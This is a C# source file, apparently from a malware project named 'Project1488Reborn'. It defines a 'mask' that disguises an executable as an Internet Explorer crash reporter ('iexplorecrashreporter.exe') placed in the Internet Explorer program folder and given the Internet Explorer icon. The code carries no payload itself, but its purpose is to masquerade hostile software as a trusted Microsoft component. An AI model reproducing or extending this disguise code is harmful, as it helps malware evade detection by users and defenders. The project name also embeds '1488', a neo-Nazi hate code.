using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;

namespace Project1488Reborn.Masks
{
    class MInternetExplorer : Mask
    {
        public override DirectoryInfo MaskDir => new DirectoryInfo($"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}\\Internet Explorer\\");

        public override string NameMainFile => "iexplorecrashreporter.exe";

        public override Icon icon => Properties.Resources.InternetExplorer;

        public override bool Enable => true;
    }
}
